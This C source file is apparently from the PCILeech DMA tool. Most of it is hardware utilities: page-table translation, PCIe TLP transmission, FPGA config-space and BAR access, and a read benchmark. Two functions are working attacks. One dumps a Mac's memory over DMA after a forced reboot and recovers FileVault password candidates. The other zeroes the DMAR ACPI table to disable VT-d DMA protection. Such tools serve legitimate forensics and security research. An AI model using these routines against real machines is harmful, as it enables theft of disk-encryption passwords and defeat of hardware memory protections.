// extra.c : implementation related various extra functionality such as exploits.
//
// (c) Ulf Frisk, 2016-2025
// Author: Ulf Frisk, pcileech@frizk.net
//
#include "extra.h"
#include "device.h"
#include "util.h"

VOID Extra_MacFVRecover_ReadMemory_Optimized(_Inout_ PBYTE pb512M)
{
    DWORD i, dwOffsets[] = {
        0x74000000, 0x75000000, 0x76000000, 0x77000000, 0x78000000, 0x79000000, 0x7a000000, 0x7b000000,
        0x7c000000, 0x7d000000, 0x7e000000, 0x7f000000, 0x80000000, 0x81000000, 0x82000000, 0x83000000,
        0x84000000, 0x85000000, 0x86000000, 0x87000000, 0x70000000, 0x71000000, 0x72000000, 0x73000000,
        0x88000000, 0x89000000, 0x8a000000, 0x8b000000, 0x8c000000, 0x8d000000, 0x8e000000, 0x8f000000
    };
    for(i = 0; i < sizeof(dwOffsets) / sizeof(DWORD); i++) {
        DeviceReadDMA(dwOffsets[i], 0x01000000, pb512M + dwOffsets[i] - 0x70000000, NULL);
    }
}

BOOL Extra_MacFVRecover_Analyze(_In_ PBYTE pb512M)
{
    DWORD i, o, dwCandidate;
    PBYTE pb;
    BOOL isFound = 0;
    const BYTE CONST_ZERO_32[32] = { 0 };
    BYTE pbLast[32];
    memset(pbLast, 0x00, 32);
    for(o = 0; o < 0x20000000; o += 0x1000) {
        pb = (PBYTE)(pb512M + o);
        if(*(PDWORD)pb != 0x30646870) { // signature "phd0"
            continue; // not correct signature -> skip this page.
        }
        dwCandidate = 0;
        for(i = 0x18; i < 0x800; i += 8) {
            if((*(PQWORD)(pb + i) & 0xff00ff00ff00ff00)) {
                break; // non ascii chars in qword block -> skip this page.
            }
            if(dwCandidate == 0) {
                if(!*(PQWORD)(pb + i)) {
                    continue; // empty block -> page is still a candidate.
                }
                if(0 == pb[i + 6]) {
                    break; // less than 4 chars in pwd candidate -> skip this page.
                }
                if(*(PQWORD)(pb + i) == 0x0043005f00520047) {
                    break; // known false positive starts with GR_C -> skip this page.
                }
                dwCandidate = i;
                continue;
            }
            if(0 == *(PQWORD)(pb + i)) {
                if(memcmp(pb + i, CONST_ZERO_32, 32)) {
                    break; // not 32 bytes of zero after pwd candidate -> skip this page.
                }
                // password candidate found!!!
                isFound = TRUE;
                if(memcmp(pbLast, pb + dwCandidate, 32)) { // duplicate removal
                    memcpy(pbLast, pb + dwCandidate, 32);
#ifdef _WIN32
                    printf("MAC_FVRECOVER: PASSWORD CANDIDATE: %S\n", (LPWSTR)(pb + dwCandidate));
#endif /* _WIN32 */
#if defined(LINUX) || defined(MACOS)
                    printf("MAC_FVRECOVER: PASSWORD CANDIDATE (hex8): %llx\n", *(PQWORD)(pb + dwCandidate));
#endif /* LINUX || MACOS */
                }
                break;
            }
        }
    }
    return isFound;
}

VOID Extra_MacFVRecover_SetOutFileName()
{
    SYSTEMTIME st;
    if(ctxMain->cfg.szFileOut[0] == 0) {
        GetLocalTime(&st);
        _snprintf_s(
            ctxMain->cfg.szFileOut,
            MAX_PATH,
            _TRUNCATE,
            "pcileech-mac-fvrecover-%i%02i%02i-%02i%02i%02i.raw",
            st.wYear,
            st.wMonth,
            st.wDay,
            st.wHour,
            st.wMinute,
            st.wSecond);
    }
}

VOID Action_MacFilevaultRecover(_In_ BOOL IsRebootRequired)
{
    FILE *pFile = NULL;
    PBYTE pbBuffer512M;
    // Allocate 512 MB buffer
    if(!(pbBuffer512M = LocalAlloc(LMEM_ZEROINIT, 0x20000000))) {
        printf("MAC_FVRECOVER: FAILED. Unable to allocate memory.\n");
        return;
    }
    if(IsRebootRequired) {
        // Wait for target computer reboot (device will power cycle).
        printf(
            "MAC_FVRECOVER: WAITING ... please reboot ...\n" \
            "  Please force a reboot of the mac by pressing CTRL+CMD+POWER\n" \
            "  WARNING! This will not work in macOS Sierra 10.12.2 and later.\n");
        Util_WaitForPowerCycle();
    } else {
        // Wait for DMA read access to target computer.
        printf("MAC_FVRECOVER: WAITING for DMA access ...\n");
        Util_WaitForPowerOn();
    }
    // Try read 512M of memory from in the range: [0x70000000..0x90000000[.
    printf("MAC_FVRECOVER: Continuing ...\n");
    Extra_MacFVRecover_ReadMemory_Optimized(pbBuffer512M);
    // Try write to disk image.
    printf("MAC_FVRECOVER: Writing partial memory contents to file ...\n");
    Extra_MacFVRecover_SetOutFileName();
    if(!fopen_s(&pFile, ctxMain->cfg.szFileOut, "r") || pFile) {
        printf("MAC_FVRECOVER: Error writing partial memory contents to file. File exists.\n");
        if(pFile) { fclose(pFile); }
        pFile = NULL;
    } else if(fopen_s(&pFile, ctxMain->cfg.szFileOut, "wb") || !pFile) {
        printf("MAC_FVRECOVER: Error writing partial memory contents to file.\n");
        pFile = NULL;
    }
    else if(0x20000000 != fwrite(pbBuffer512M, 1, 0x20000000, pFile)) {
        printf("MAC_FVRECOVER: Error writing partial memory contents to file.\n");
    } else {
        printf("MAC_FVRECOVER: File: %s.\n", ctxMain->cfg.szFileOut);
    }
    // Analyze for possible password candidates.
    printf("MAC_FVRECOVER: Analyzing ...\n");
    if(Extra_MacFVRecover_Analyze(pbBuffer512M)) {
        printf("MAC_FVRECOVER: Completed.\n");
    } else {
        printf("MAC_FVRECOVER: Failed.\n");
    }
    // clean up.
    LocalFree(pbBuffer512M);
    if(pFile) { fclose(pFile); }
}

VOID Action_MacDisableVtd()
{
    PBYTE pb16M;
    BYTE ZERO16[16] = { 0 };
    DWORD i, j, dwAddress, dwOffsets[] = {
        0x8a000000, 0x8b000000, 0x8c000000, 0x8d000000, 0x89000000, 0x88000000, 0x87000000, 0x86000000
    };
    // Allocate 16 MB buffer
    if(!(pb16M = LocalAlloc(LMEM_ZEROINIT, 0x01000000))) {
        printf("MAC_DISABLE_VTD: FAILED. Unable to allocate memory.\n");
        return;
    }
    // Wait for DMA read access to target computer.
    printf("MAC_DISABLE_VTD: WAITING for DMA access ...\n");
    Util_WaitForPowerOn();
    // DMAR table assumed to be on page boundary. This doesn't have to be true,
    // but it seems like it is on the MACs.
    for(i = 0; i < sizeof(dwOffsets) / sizeof(DWORD); i++) {
        if(DeviceReadDMA(dwOffsets[i], 0x01000000, pb16M, NULL)) {
            for(j = 0; j < 0x01000000; j += 0x1000) {
                if(*(PQWORD)(pb16M + j) == 0x0000008852414d44) {
                    dwAddress = dwOffsets[i] + j;
                    if(LcWrite(ctxMain->hLC, dwAddress, 16, ZERO16)) {
                        printf("MAC_DISABLE_VTD: VT-d DMA protections should now be disabled ...\n");
                        printf("MAC_DISABLE_VTD: DMAR ACPI table found and removed at: 0x%08x\n", dwAddress);
                        LocalFree(pb16M);
                        return;
                    }
                }
            }
        }
    }
    LocalFree(pb16M);
    printf("MAC_DISABLE_VTD: Failed to disable VT-d DMA protections.\n");
}

VOID Action_PT_Phys2Virt()
{
    BOOL result;
    QWORD qwVA, qwPTE, qwPDE, qwPDPTE, qwPML4E;
    printf("PT_PHYS2VIRT: searching ... (this may take some time).\n");
    result = Util_PageTable_FindMappedAddress(ctxMain->cfg.paCR3, ctxMain->cfg.qwDataIn[0], &qwVA, &qwPTE, &qwPDE, &qwPDPTE, &qwPML4E);
    if(result) {
        printf("PT_PHYS2VIRT: finished.\n");
        printf("          0x00000000FFFFFFFF\n");
        printf("   PA:    0x%016llx\n", ctxMain->cfg.qwDataIn[0]);
        printf("   VA:    0x%016llx\n", qwVA);
        printf("   PTE:   0x%016llx\n", qwPTE);
        printf("   PDE:   0x%016llx\n", qwPDE);
        printf("   PDPTE: 0x%016llx\n", qwPDPTE);
        printf("   PML4E: 0x%016llx\n", qwPML4E);
    } else {
        printf("PT_PHYS2VIRT: Failed.\n");
    }
}

VOID Action_PT_Virt2Phys()
{
    BOOL result;
    QWORD qwPA, qwPageBase, qwPageSize;
    result = Util_PageTable_Virtual2Physical(ctxMain->cfg.paCR3, ctxMain->cfg.qwDataIn[0], &qwPA, &qwPageBase, &qwPageSize);
    if(result) {
        printf("PT_VIRT2PHYS: Successful.\n");
        printf("               0x00000000FFFFFFFF\n");
        printf("   VA:         0x%016llx\n", ctxMain->cfg.qwDataIn[0]);
        printf("   PA:         0x%016llx\n", qwPA);
        printf("   PG SIZE:    0x%016llx\n", qwPageSize);
        printf("   PG BASE PA: 0x%016llx\n", qwPageBase);
        printf("   CR3/PML4:   0x%016llx\n", ctxMain->cfg.paCR3);
    } else {
        printf("PT_VIRT2PHYS: Failed.\n");
    }
}

/*
* Dummy callback to receive TLPs from LeechCore.
* This is required to keep TLP receiver thread in LeechCore running.
*/
VOID Action_TlpTx_DummyCB(_In_opt_ PVOID ctx, _In_ DWORD cbTlp, _In_ PBYTE pbTlp, _In_opt_ DWORD cbInfo, _In_opt_ LPSTR szInfo)
{
    ;
}

VOID Action_TlpTx()
{
    DWORD dwListenTlpMs = 100;
    if(ctxMain->cfg.cbIn < 12) {
        printf("Action_TlpTx: Invalid TLP (too short).\n");
        return;
    }
    if(ctxMain->cfg.cbIn % 4) {
        printf("Action_TlpTx: Invalid TLP (length not multiple of 4).\n");
        return;
    }
    printf("TLP: Transmitting PCIe TLP.%s\n", ctxMain->cfg.fVerboseExtra ? "" : " (use -vvv option for detailed info).");
    LcCommand(ctxMain->hLC, LC_CMD_FPGA_TLP_FUNCTION_CALLBACK, 0, (PBYTE)LC_TLP_FUNCTION_CALLBACK_DUMMY, NULL, NULL);
    if(ctxMain->cfg.fLoop) {
        printf("TLP: Starting loop TLP transmit. Press CTRL+C to abort.\n");
        while(TRUE) {
            LcCommand(ctxMain->hLC, LC_CMD_FPGA_TLP_WRITE_SINGLE, (DWORD)ctxMain->cfg.cbIn, ctxMain->cfg.pbIn, NULL, NULL);
        }
        return;
    }
    LcCommand(ctxMain->hLC, LC_CMD_FPGA_TLP_WRITE_SINGLE, (DWORD)ctxMain->cfg.cbIn, ctxMain->cfg.pbIn, NULL, NULL);
    Sleep(dwListenTlpMs);
    LcCommand(ctxMain->hLC, LC_CMD_FPGA_TLP_FUNCTION_CALLBACK, 0, (PBYTE)LC_TLP_FUNCTION_CALLBACK_DISABLE, NULL, NULL);
}

VOID Action_TlpTxLoop()
{
    WORD wTxSleep = 64, wValid = 0;
    DWORD dwMax = 0xffffffff, dwListenTlpMs = 100, dwEnableTx = 0x00080008, dwDisableTx = 0x00080000;
    QWORD i, qwFpgaVersionMajor = 0, qwFpgaVersionMinor = 0;
    if(ctxMain->cfg.cbIn < 12) {
        printf("Action_TlpTxLoop: Invalid TLP (too short).\n");
        return;
    }
    if(ctxMain->cfg.cbIn > 48) {
        printf("Action_TlpTxLoop: Invalid TLP (too long).\n");
        return;
    }
    if(ctxMain->cfg.cbIn % 4) {
        printf("Action_TlpTxLoop: Invalid TLP (length not multiple of 4).\n");
        return;
    }
    LcGetOption(ctxMain->hLC, LC_OPT_FPGA_VERSION_MAJOR, &qwFpgaVersionMajor);
    LcGetOption(ctxMain->hLC, LC_OPT_FPGA_VERSION_MINOR, &qwFpgaVersionMinor);
    if((qwFpgaVersionMajor < 4) || ((qwFpgaVersionMajor == 4) && (qwFpgaVersionMinor < 2))) {
        printf("Action_TlpTxLoop: FPGA version not supported (bitstream v4.2 or later required).\n");
        return;
    }
    // start background reader thread (to print out any received TLPs):
    LcCommand(ctxMain->hLC, LC_CMD_FPGA_TLP_FUNCTION_CALLBACK, 0, (PBYTE)LC_TLP_FUNCTION_CALLBACK_DUMMY, NULL, NULL);
    printf("TLP: Transmitting PCIe LOOP TLPs. Press any key to stop.%s\n", ctxMain->cfg.fVerboseExtra ? "" : " (use -vvv option for detailed info).");
    // tx each 64 clk [66MHz - 15ns clk] (15ns * 64 -> ~1uS)
    LcCommand(ctxMain->hLC, LC_CMD_FPGA_CFGREGPCIE | 0x801e, sizeof(WORD), (PBYTE)&wTxSleep, NULL, NULL);
    // tlp value
    LcCommand(ctxMain->hLC, LC_CMD_FPGA_CFGREGPCIE | 0x8020, (DWORD)ctxMain->cfg.cbIn, ctxMain->cfg.pbIn, NULL, NULL);
    // set "infinite" [very long] loop
    LcCommand(ctxMain->hLC, LC_CMD_FPGA_CFGREGPCIE | 0x8050, sizeof(DWORD), (PBYTE)&dwMax, NULL, NULL);
    // set valid TLP QWORDs
    i = ctxMain->cfg.cbIn;
    wValid = 1 | ((i % 8) ? 0 : 2);
    i -= (i % 8) ? 4 : 8;
    while(i) {
        i -= 8;
        wValid = 2 | (wValid << 2);
    }
    LcCommand(ctxMain->hLC, LC_CMD_FPGA_CFGREGPCIE | 0x801c, sizeof(WORD), (PBYTE)&wValid, NULL, NULL);
    // start tx
    LcCommand(ctxMain->hLC, LC_CMD_FPGA_CFGREGPCIE_MARKWR | 0x8002, sizeof(DWORD), (PBYTE)&dwEnableTx, NULL, NULL);
    // wait for keypress to stop
    while(!_kbhit()) {
        ;
    }
    // stop
    LcCommand(ctxMain->hLC, LC_CMD_FPGA_CFGREGPCIE_MARKWR | 0x8002, sizeof(DWORD), (PBYTE)&dwDisableTx, NULL, NULL);
    LcCommand(ctxMain->hLC, LC_CMD_FPGA_TLP_FUNCTION_CALLBACK, 0, (PBYTE)LC_TLP_FUNCTION_CALLBACK_DISABLE, NULL, NULL);
}

/*
* Read/Write to FPGA PCIe shadow configuration space.
*/
VOID Action_RegCfgReadWrite()
{
    BOOL fResult;
    FILE *pFile = NULL;
    PBYTE pbLcCfgSpace4096 = NULL;
    if(ctxMain->cfg.cbIn) {
        // WRITE mode:
        if((ctxMain->cfg.paAddrMin > 0x1000) || (ctxMain->cfg.paAddrMin + ctxMain->cfg.cbIn > 0x1000)) {
            printf("REGCFG: Write failed outside FPGA PCIe shadow configuration space (0x1000).\n");
            return;
        }
        fResult = LcCommand(
            ctxMain->hLC,
            LC_CMD_FPGA_CFGSPACE_SHADOW_WR | ctxMain->cfg.paAddrMin,
            (DWORD)ctxMain->cfg.cbIn,
            ctxMain->cfg.pbIn,
            NULL,
            NULL
        );
        if(fResult) {
            printf("REGCFG: Write SUCCESS!\n");
        } else {
            printf("REGCFG: Write to FPGA PCIe shadow configuration space failed.\n");
        }
        return;
    }
    // READ mode:
    fResult = LcCommand(
        ctxMain->hLC,
        LC_CMD_FPGA_CFGSPACE_SHADOW_RD,
        0,
        NULL,
        &pbLcCfgSpace4096,
        NULL
    );
    if(!fResult) {
        printf("REGCFG: Read FPGA PCIe shadow configuration space failed.\n");
        return;
    }
    // READ success:
    if(ctxMain->cfg.szFileOut[0]) {
        // open output file
        if(!fopen_s(&pFile, ctxMain->cfg.szFileOut, "r") || pFile) {
            printf("REGCFG: Error writing output to file. File already exists: %s\n", ctxMain->cfg.szFileOut);
            goto fail;
        }
        if(fopen_s(&pFile, ctxMain->cfg.szFileOut, "wb") || !pFile) {
            printf("REGCFG: Error writing output to file.\n");
            goto fail;
        }
        if(0x1000 != fwrite(pbLcCfgSpace4096, 1, 0x1000, pFile)) {
            printf("REGCFG: Error writing output to file.\n");
            goto fail;
        }
        printf("REGCFG: Wrote %i bytes to file %s.\n", 0x1000, ctxMain->cfg.szFileOut);
    }
    if(ctxMain->cfg.paAddrMin < 0x1000) {
        // print to screen
        printf("REGCFG: Please see result below: \n================================ \n");
        if((ctxMain->cfg.paAddrMin > ctxMain->cfg.paAddrMax) || (ctxMain->cfg.paAddrMax > 0xfff)) {
            ctxMain->cfg.paAddrMax = 0xfff;
        }
        Util_PrintHexAscii(
            pbLcCfgSpace4096,
            (DWORD)(ctxMain->cfg.paAddrMax + 1),
            (DWORD)ctxMain->cfg.paAddrMin
        );
    }
fail:
    if(pFile) { fclose(pFile); }
    LcMemFree(pbLcCfgSpace4096);
}



//-----------------------------------------------------------------------------
// PCIe BAR read/write functionality (with callback) below:
//-----------------------------------------------------------------------------
static PBYTE pbBarBuffer[6] = { NULL, NULL, NULL, NULL, NULL, NULL };

/*
* Callback function to be called when a PCIe BAR read/write is requested from the host system.
*/
VOID Extra_BarReadWriteCallback(_Inout_ PLC_BAR_REQUEST pBarRequest)
{
    DWORD i;
    PBYTE pb = pbBarBuffer[pBarRequest->pBar->iBar];
    if(pBarRequest->fWrite && pb) {
        if((pBarRequest->bFirstBE == 0xf) && (pBarRequest->bLastBE == 0xf)) {
            // full write:
            memcpy(pb + pBarRequest->oData, pBarRequest->pbData, pBarRequest->cbData);
            return;
        } else {
            // partial write:
            // first byte enable:
            for(i = 0; i < 4; i++) {
                if((pBarRequest->bFirstBE >> i) & 1) {
                    pb[pBarRequest->oData + i] = pBarRequest->pbData[i];
                }
            }
            // middle bytes:
            if(pBarRequest->cbData > 8) {
                memcpy(pb + pBarRequest->oData + 4, pBarRequest->pbData + 4, pBarRequest->cbData - 8);
            }
            // last byte enable:
            if(pBarRequest->cbData > 4) {
                for(i = 0; i < 4; i++) {
                    if((pBarRequest->bLastBE >> i) & 1) {
                        pb[pBarRequest->oData + pBarRequest->cbData - 4 + i] = pBarRequest->pbData[pBarRequest->cbData - 4 + i];
                    }
                }
            }
            return;
        }
    }
    if(pBarRequest->fRead && pb) {
        memcpy(pBarRequest->pbData, pb + pBarRequest->oData, pBarRequest->cbData);
        pBarRequest->fReadReply = TRUE;
        return;
    }
}

/*
* Register a callback that will implement read/write support of PCIe BARs.
*/
VOID Extra_BarReadWriteInitialize()
{
    DWORD i;
    LC_BAR Bar[6] = { 0 };
    PBYTE pbBarInfoBuffer = NULL;
    // 1: retrieve BAR info from the FPGA using the LC_CMD_FPGA_BAR_INFO command, copy and free memory.
    if(!LcCommand(ctxMain->hLC, LC_CMD_FPGA_BAR_INFO, 0, NULL, &pbBarInfoBuffer, NULL) || !pbBarInfoBuffer) {
        printf("BAR: Error reading BAR info.\n");
        return;
    }
    memcpy(Bar, pbBarInfoBuffer, 6 * sizeof(LC_BAR));
    LcMemFree(pbBarInfoBuffer);
    pbBarInfoBuffer = NULL;
    // 2: allocate memory for BARs (if sane buffer sizes):
    for(i = 0; i < 6; i++) {
        if(Bar[i].fValid && Bar[i].cb < 128*1024*1024) {
            pbBarBuffer[i] = LocalAlloc(LMEM_ZEROINIT, Bar[i].cb);
            if(!pbBarBuffer[i]) {
                printf("BAR: Error allocating memory for BAR %i.\n", i);
                return;
            }
        }
    }
    // 3: register callback function for BAR read/write requests:
    if(!LcCommand(ctxMain->hLC, LC_CMD_FPGA_BAR_FUNCTION_CALLBACK, 0, (PBYTE)Extra_BarReadWriteCallback, NULL, NULL)) {
        printf("BAR: Error registering callback function and enabling BAR TLP processing.\n");
        return;
    }
}



//-----------------------------------------------------------------------------
// PCIe BAR read/write functionality (with callback) below:
//-----------------------------------------------------------------------------
/*
* Helper function to benchmark read speed of a certain byte size.
* -- ppMEMs
* -- cb
* -- return value: bytes per second
*/
QWORD Extra_Benchmark_ReadSingle(_In_ PPMEM_SCATTER ppMEMs, _In_ QWORD cb)
{
    LPSTR szcbUnit, szcbsUnit;
    QWORD cbo, cbUnit, cbs, cbsUnit, tmStart, tmEnd, c = 0, cFail = 0, pcFail;
    if(cb < 0x1000) {
        szcbUnit = "B "; cbUnit = cb;
    } else if(cb < 0x100000) {
        szcbUnit = "kB"; cbUnit = cb / 1024;
    } else {
        szcbUnit = "MB"; cbUnit = cb / (1024 * 1024);
    }
    tmStart = GetTickCount64();
    while((tmEnd = GetTickCount64()) - tmStart < 5000) {
        for(cbo = 0; cbo < cb; cbo += 0x1000) {
            ppMEMs[cbo >> 12]->cb = (DWORD)min(0x1000, cb);
            ppMEMs[cbo >> 12]->f = FALSE;
        }
        LcReadScatter(ctxMain->hLC, max(1, (DWORD)(cb >> 12)), ppMEMs);
        for(cbo = 0; cbo < cb; cbo += 0x1000) {
            if(!ppMEMs[cbo >> 12]->f) {
                cFail++;
                break;
            }
        }
        c++;
    }
    cbs = cb * c / 5;
    pcFail = (cFail * 100) / c;
    if(cbs < 2 * 1024 * 1024) {
        cbsUnit = cbs / 1024;
        szcbsUnit = "kB/s";
    } else {
        cbsUnit = cbs / (1024*1024);
        szcbsUnit = "MB/s";
    }
    if(cFail) {
        printf("READ %3llu %s %8llu reads/s %5llu %s (failed: %llu%%)\n", cbUnit, szcbUnit, (c / 5), cbsUnit, szcbsUnit, pcFail);
    } else {
        printf("READ %3llu %s %8llu reads/s %5llu %s\n", cbUnit, szcbUnit, (c / 5), cbsUnit, szcbsUnit);
    }
    return cbs;
}


VOID Action_Benchmark()
{
    // Allocate 16MB memory as MEMs:
    PPMEM_SCATTER ppMEMs = NULL;
    DWORD i, cMEMs = 0x1000;
    QWORD cbs, qwTiny;
    printf("================ PCILEECH BENCHMARK START ================\n");
    if(!LcAllocScatter1(cMEMs, &ppMEMs)) {
        printf("BENCHMARK: Error allocating memory.\n");
        return;
    }
    for(i = 0; i < cMEMs; i++) {
        ppMEMs[i]->qwA = 0x1000;
    }
    Extra_Benchmark_ReadSingle(ppMEMs, 8);          // 8 bytes
    Extra_Benchmark_ReadSingle(ppMEMs, 128);        // 128 bytes
    Extra_Benchmark_ReadSingle(ppMEMs, 512);        // 512 bytes
    Extra_Benchmark_ReadSingle(ppMEMs, 0x1000);     // 4 KB
    Extra_Benchmark_ReadSingle(ppMEMs, 0x10000);    // 64 KB
    Extra_Benchmark_ReadSingle(ppMEMs, 0x100000);   // 1 MB
    cbs = Extra_Benchmark_ReadSingle(ppMEMs, 0x1000000);  // 16 MB
    printf("================ PCILEECH BENCHMARK FINISH ================\n");
    if((cbs < 45 * 1024 * 1024) && LcGetOption(ctxMain->hLC, LC_OPT_FPGA_ALGO_TINY, &qwTiny)) {
        // This is a FPGA device - otherwise the option would not exist.
        if(qwTiny) {
            printf("BENCHMARK: WARNING! Read speed is slow.\n           TINY PCIe TLP algrithm auto-selected!\n");
        } else {
            printf("BENCHMARK: WARNING! Read speed is slow.\n           USB connection most likely at USB2 speed.\n           Check port/cable/connection for issues.");
        }
    }
    LcMemFree(ppMEMs);
}
